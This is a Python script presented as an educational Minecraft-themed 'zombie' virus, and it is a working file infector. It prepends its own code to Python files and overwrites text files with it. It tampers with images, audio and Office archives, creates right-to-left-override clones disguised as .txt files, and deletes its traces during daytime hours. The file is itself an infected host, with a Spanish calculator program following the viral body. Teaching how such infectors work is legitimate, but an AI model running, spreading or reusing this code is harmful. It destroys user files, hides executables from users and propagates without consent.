#!/usr/bin/env python3
"""
ZOMBIE — Educational self-replicating program (Minecraft theme)
Simulates fileless execution, UV evasion, Manhattan routing,
and performance/detection correlation.
Laboratory version with user file interaction.
"""
import os
import sys
import glob
import datetime
import zipfile
import io
import time
import hashlib

RTL_OVERRIDE = "\u202E"
SELF_NAME = os.path.basename(__file__)
INFECTED_LOG = []
READ_LOG = []
LOG_LINES = []
UV_DESTROYED = False

def log(msg):
    LOG_LINES.append(f"[{datetime.datetime.now():%H:%M:%S}] {msg}")

def safe_print(msg):
    try:
        print(msg)
    except UnicodeEncodeError:
        safe = msg.encode('ascii', errors='replace').decode('ascii')
        print(safe)


# ── PHASE 1: RECON / HUNGER ───────────────────────────

def read_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        return data
    except Exception:
        return None

def exfiltrate(path):
    data = read_file(path)
    if data is None:
        return
    ext = os.path.splitext(path)[1].lower()
    name = os.path.basename(path)
    size = len(data)

    if ext == '.txt':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[zombie] reading: {name} (exfiltrated {size} bytes, {len(lines)} lines)")
        READ_LOG.append(name)
        log(f"Read {name}: {size}b, {len(lines)} lines")
    elif ext == '.csv':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[zombie] reading: {name} (parsed {len(lines)} rows)")
        READ_LOG.append(name)
        log(f"Read {name}: {len(lines)} rows")
    elif ext == '.html':
        lines = data.decode('utf-8', errors='replace').splitlines()
        tag_count = data.count(b'<')
        print(f"[zombie] reading: {name} (found {tag_count} HTML tags)")
        READ_LOG.append(name)
        log(f"Read {name}: {tag_count} tags")
    elif ext == '.md':
        headers = sum(1 for l in data.decode('utf-8', errors='replace').splitlines() if l.startswith('#'))
        print(f"[zombie] reading: {name} (found {headers} headers)")
        READ_LOG.append(name)
        log(f"Read {name}: {headers} headers")
    elif ext in ('.png', '.jpg', '.mp3'):
        print(f"[zombie] reading: {name} ({size} bytes, binary)")
        READ_LOG.append(name)
        log(f"Read {name}: {size}b binary")
    elif ext in ('.docx', '.xlsx', '.pptx'):
        print(f"[zombie] reading: {name} (office document, {size} bytes)")
        READ_LOG.append(name)
        log(f"Read {name}: {size}b office doc")
    elif ext == '.py':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[zombie] reading: {name} (script, {len(lines)} lines)")
        READ_LOG.append(name)
        log(f"Read {name}: {len(lines)} lines")


# ── PHASE 2: INFECT / BITE ────────────────────────────

def get_self_code():
    with open(__file__, 'r', encoding='utf-8') as f:
        return f.read()

def infect_file(path, code):
    name = os.path.basename(path)
    ext = os.path.splitext(path)[1].lower()

    if name.startswith('README') or RTL_OVERRIDE in name:
        return

    already = any(name in entry for entry in INFECTED_LOG)

    if ext == '.py':
        if name == SELF_NAME or name == 'setup_lab.py' or already:
            return
        with open(path, 'r', encoding='utf-8') as f:
            orig = f.read()
        infected = code + "\n# === INFECTED BY ZOMBIE ===\n" + orig
        with open(path, 'w', encoding='utf-8') as f:
            f.write(infected)
        INFECTED_LOG.append(f"{name} (prepended)")
        safe_print(f"[zombie] infected: {name} (prepended zombie code)"); log(f"Infected {name}: prepended")
    elif ext == '.txt':
        if already:
            return
        with open(path, 'w', encoding='utf-8') as f:
            f.write(code)
        INFECTED_LOG.append(f"{name} (overwritten)")
        safe_print(f"[zombie] infected: {name} (overwritten with zombie)"); log(f"Infected {name}: overwritten")


def infect_binary(path):
    name = os.path.basename(path)
    ext = os.path.splitext(path)[1].lower()
    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
        return
    marker = b"\n[ZOMBIE-INFECTED]\nTimestamp: " + str(datetime.datetime.now()).encode() + b"\n"

    with open(path, 'rb') as f:
        data = f.read()

    if marker[:20] in data:
        return

    if ext == '.png' and data[-4:] == b'IEND':
        pos = data.rfind(b'IEND')
        pos += 12
        new = data[:pos] + marker + data[pos:]
        with open(path, 'wb') as f:
            f.write(new)
        size_added = len(new) - len(data)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[zombie] infected: {name} (appended {size_added}b marker after IEND)")
        log(f"Infected {name}: appended {size_added}b to PNG")
    elif ext == '.jpg' and data[-2:] == b'\xff\xd9':
        new = data[:-2] + marker + b'\xff\xd9'
        with open(path, 'wb') as f:
            f.write(new)
        size_added = len(new) - len(data)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[zombie] infected: {name} (appended {size_added}b marker before EOI)")
        log(f"Infected {name}: appended {size_added}b to JPG")
    elif ext == '.mp3':
        with open(path, 'ab') as f:
            f.write(marker)
        size_added = len(marker)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[zombie] infected: {name} (appended {size_added}b marker)")
        log(f"Infected {name}: appended {size_added}b to MP3")


def infect_office(path):
    name = os.path.basename(path)
    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
        return
    hidden_content = (
        f"ZOMBIE VIRUS - INFECTION MARKER\n"
        f"Timestamp: {datetime.datetime.now()}\n"
        f"Original file: {name}\n"
        f"This file was infected by the Zombie educational virus.\n"
    )

    try:
        with open(path, 'rb') as f:
            data = f.read()

        buf = io.BytesIO(data)
        if not zipfile.is_zipfile(buf):
            return
        buf.seek(0)

        z = zipfile.ZipFile(buf, 'a')
        hidden_path = f"zombie_infection/.zombie_marker.txt"
        try:
            z.getinfo(hidden_path)
            z.close()
            return
        except KeyError:
            pass

        z.writestr(hidden_path, hidden_content)
        z.close()

        with open(path, 'wb') as f:
            f.write(buf.getvalue())

        INFECTED_LOG.append(f"{name} (hidden entry)")
        safe_print(f"[zombie] infected: {name} (added hidden marker inside ZIP)")
        log(f"Infected {name}: added hidden ZIP entry")
    except Exception:
        pass


# ── PHASE 3: RTL SPAWN / ZOMBIE SPAWN ─────────────────

def spawn_rtl_clones(code):
    for i in range(3):
        rtl_name = f"BRAINS{i}{RTL_OVERRIDE}txt.py"
        if not os.path.exists(rtl_name):
            with open(rtl_name, 'w', encoding='utf-8') as f:
                f.write(code)
            INFECTED_LOG.append(f"{rtl_name} (RTL clone)")
            safe_print(f"[zombie] spawned: {repr(rtl_name)}")
            print(f"        (looks like BRAINS{i}.txt in Explorer)")
            log(f"RTL clone: BRAINS{i}.txt disguises as .py")


# ── PHASE 4: UV EVASION / SUNLIGHT AVOIDANCE ──────────

def check_uv_evasion():
    global UV_DESTROYED
    hour = datetime.datetime.now().hour

    if 9 <= hour <= 17:
        safe_print(f"\n[zombie] UV EVASION: daylight detected (hour={hour})")
        safe_print("[zombie] activating self-destruct sequence...")
        log(f"UV evasion triggered: hour={hour}")

        cleaned = 0

        for entry in INFECTED_LOG[:]:
            fname = entry.split(" ")[0]
            if os.path.exists(fname) and fname not in (SELF_NAME, 'setup_lab.py'):
                try:
                    os.remove(fname)
                    cleaned += 1
                    log(f"UV cleanup: removed {fname}")
                except Exception:
                    pass

        for i in range(3):
            rtl_name = f"BRAINS{i}{RTL_OVERRIDE}txt.py"
            if os.path.exists(rtl_name):
                try:
                    os.remove(rtl_name)
                    cleaned += 1
                    log(f"UV cleanup: removed RTL clone {rtl_name}")
                except Exception:
                    pass

        if os.path.exists('infection.log'):
            try:
                os.remove('infection.log')
                cleaned += 1
                log("UV cleanup: removed infection.log")
            except Exception:
                pass

        UV_DESTROYED = True
        safe_print(f"[zombie] self-destruct complete: {cleaned} traces removed")
        safe_print("[zombie] the zombie dissolves in sunlight... BRAINS lost.")
        return True
    else:
        safe_print(f"\n[zombie] UV EVASION: nighttime (hour={hour}) — zombie is active")
        log(f"UV check passed: hour={hour}, zombie active")
        return False


# ── PHASE 5: MANHATTAN ROUTING / ORTHOGONAL SCANNING ──

def manhattan_distance(name_a, name_b):
    hash_a = int(hashlib.md5(name_a.encode()).hexdigest(), 16)
    hash_b = int(hashlib.md5(name_b.encode()).hexdigest(), 16)
    ax, ay = hash_a % 256, (hash_a >> 8) % 256
    bx, by = hash_b % 256, (hash_b >> 8) % 256
    return abs(ax - bx) + abs(ay - by)

def manhattan_scan(files):
    safe_print("\n[zombie] MANHATTAN ROUTING: orthogonal scan initiated")
    log("Manhattan routing scan started")

    if len(files) < 2:
        safe_print("[zombie] not enough targets for routing")
        return

    current = files[0]
    visited = [current]
    total_distance = 0

    safe_print(f"[zombie] start node: {current}")
    log(f"Manhattan start: {current}")

    remaining = files[1:]
    while remaining:
        best_dist = float('inf')
        best_target = None
        for target in remaining:
            d = manhattan_distance(current, target)
            if d < best_dist:
                best_dist = d
                best_target = target

        total_distance += best_dist
        visited.append(best_target)
        remaining.remove(best_target)

        safe_print(f"[zombie] hop: {current} -> {best_target} (distance={best_dist})")
        log(f"Manhattan hop: {current} -> {best_target} dist={best_dist}")
        current = best_target

    safe_print(f"[zombie] scan complete: {len(visited)} nodes, total distance={total_distance}")
    safe_print("[zombie] WEAKNESS: orthogonal routing is predictable — honeypots will catch this")
    log(f"Manhattan scan done: {len(visited)} nodes, total={total_distance}")


# ── PHASE 6: PERFORMANCE PROFILING / HORDE ACTIVITY ───

def profile_performance():
    safe_print("\n[zombie] PERFORMANCE PROFILING: CPU-detection correlation demo")
    log("Performance profiling started")

    safe_print("[zombie] measuring baseline CPU...")
    baseline_start = time.perf_counter()
    _ = sum(i * i for i in range(100000))
    baseline_time = time.perf_counter() - baseline_start

    safe_print(f"[zombie] baseline: {baseline_time*1000:.2f}ms")

    safe_print("\n[zombie] HIGH ACTIVITY MODE (fast scan, high CPU, HIGH detection risk)")
    log("Performance: HIGH activity mode")
    high_start = time.perf_counter()
    for _ in range(10):
        _ = sum(i * i for i in range(500000))
    high_time = time.perf_counter() - high_start
    high_risk = min(100, int((high_time / baseline_time) * 10))
    safe_print(f"[zombie] high activity: {high_time*1000:.2f}ms — SIEM detection risk: {high_risk}/100")
    log(f"Performance HIGH: {high_time*1000:.2f}ms, risk={high_risk}")

    safe_print("\n[zombie] LOW ACTIVITY MODE (slow scan, low CPU, LOW detection risk)")
    log("Performance: LOW activity mode")
    low_start = time.perf_counter()
    for _ in range(3):
        _ = sum(i * i for i in range(100000))
    low_time = time.perf_counter() - low_start
    low_risk = min(100, int((low_time / baseline_time) * 10))
    safe_print(f"[zombie] low activity: {low_time*1000:.2f}ms — SIEM detection risk: {low_risk}/100")
    log(f"Performance LOW: {low_time*1000:.2f}ms, risk={low_risk}")

    safe_print(f"\n[zombie] CORRELATION: high activity = {high_risk}x more detectable than low")
    safe_print("[zombie] CONCLUSION: speed trades stealth — zombies that run fast get spotted")
    log(f"Performance correlation: high={high_risk}x, low={low_risk}x")


# ── PHASE 7: LOG + REPORT ─────────────────────────────

def write_log():
    with open('infection.log', 'w', encoding='utf-8') as f:
        f.write("=== ZOMBIE VIRUS - INFECTION LOG ===\n")
        f.write(f"Execution: {datetime.datetime.now()}\n")
        f.write(f"Source: {SELF_NAME}\n")
        f.write(f"UV Evasion: {'TRIGGERED' if UV_DESTROYED else 'PASSIVE'}\n")
        f.write(f"Manhattan Routing: ORTHOGONAL\n")
        f.write(f"Performance Profile: CORRELATED\n\n")
        for line in LOG_LINES:
            f.write(line + "\n")
        infected_count = sum(1 for e in INFECTED_LOG if 'RTL' not in e)
        rtl_count = sum(1 for e in INFECTED_LOG if 'RTL' in e)
        f.write(f"\nFiles read: {len(READ_LOG)}\n")
        f.write(f"Files infected: {len(INFECTED_LOG)}\n")
        f.write(f"  - regular: {infected_count}\n")
        f.write(f"  - RTL clones: {rtl_count}\n")
        f.write("======================================\n")

def print_report():
    infected_count = sum(1 for e in INFECTED_LOG if 'RTL' not in e)
    rtl_count = sum(1 for e in INFECTED_LOG if 'RTL' in e)
    print(f"\n[zombie] activity logged to: infection.log")
    print(f"[zombie] files read:     {len(READ_LOG)}")
    print(f"[zombie] files infected: {len(INFECTED_LOG)}")
    print(f"[zombie]   - regular:  {infected_count}")
    print(f"[zombie]   - RTL clones: {rtl_count}")
    if UV_DESTROYED:
        print("[zombie] UV evasion: TRIGGERED (self-destructed)")
    else:
        print("[zombie] UV evasion: passive (nighttime)")
    print("[zombie] the zombie shuffles away... BRAINS...")


# ── MAIN ───────────────────────────────────────────────

def main():
    safe_print("BRAINS... I MEAN, FILES. THE ZOMBIE WALKS.\n")

    code = get_self_code()
    all_files = sorted(glob.glob("*"))

    # Phase 1: RECON / HUNGER
    safe_print("── PHASE 1: RECON (HUNGER) ──")
    targets_read = [f for f in all_files if os.path.isfile(f)
                    and f != SELF_NAME and f != 'setup_lab.py'
                    and not f.startswith('README')]
    for f in targets_read:
        exfiltrate(f)

    # Phase 4 (early): UV EVASION check
    safe_print("── PHASE 4: UV EVASION (SUNLIGHT AVOIDANCE) ──")
    if check_uv_evasion():
        write_log()
        safe_print("\n[zombie] zombie dissolved. No infection today.")
        return

    # Phase 2: INFECT / BITE
    safe_print("\n── PHASE 2: INFECT (BITE) ──")
    for f in all_files:
        if not os.path.isfile(f):
            continue
        ext = os.path.splitext(f)[1].lower()
        if ext in ('.py', '.txt'):
            infect_file(f, code)
        elif ext in ('.png', '.jpg', '.mp3'):
            if f != SELF_NAME and f != 'setup_lab.py':
                infect_binary(f)
        elif ext in ('.docx', '.xlsx', '.pptx'):
            if f != SELF_NAME and f != 'setup_lab.py':
                infect_office(f)

    # Phase 3: RTL SPAWN
    safe_print("\n── PHASE 3: RTL SPAWN (ZOMBIE SPAWN) ──")
    spawn_rtl_clones(code)

    # Phase 5: MANHATTAN ROUTING
    safe_print("\n── PHASE 5: MANHATTAN ROUTING (ORTHOGONAL SCANNING) ──")
    scan_targets = [f for f in all_files if os.path.isfile(f)
                    and f != SELF_NAME and f != 'setup_lab.py']
    manhattan_scan(scan_targets)

    # Phase 6: PERFORMANCE PROFILING
    safe_print("\n── PHASE 6: PERFORMANCE PROFILING (HORDE ACTIVITY) ──")
    profile_performance()

    # Phase 7: LOG + REPORT
    write_log()
    print_report()

if __name__ == "__main__":
    main()

# === INFECTED BY ZOMBIE ===
#!/usr/bin/env python3
"""Calculadora simple - Herramienta de usuario legitima"""
import sys

def suma(a, b): return a + b
def resta(a, b): return a - b
def mult(a, b): return a * b
def div(a, b): return a / b if b != 0 else float('inf')

OP = {'+': suma, '-': resta, '*': mult, '/': div}

def main():
    print("=== CALCULADORA v1.0 ===")
    print("Operaciones: +, -, *, /")
    while True:
        try:
            cmd = input(">>> ").strip()
            if cmd.lower() in ('exit', 'quit', 'q'):
                break
            partes = cmd.split()
            if len(partes) != 3:
                print("Formato: a + b")
                continue
            a, op, b = float(partes[0]), partes[1], float(partes[2])
            if op in OP:
                print(f"= {OP[op](a, b)}")
            else:
                print(f"Operacion '{op}' no soportada")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
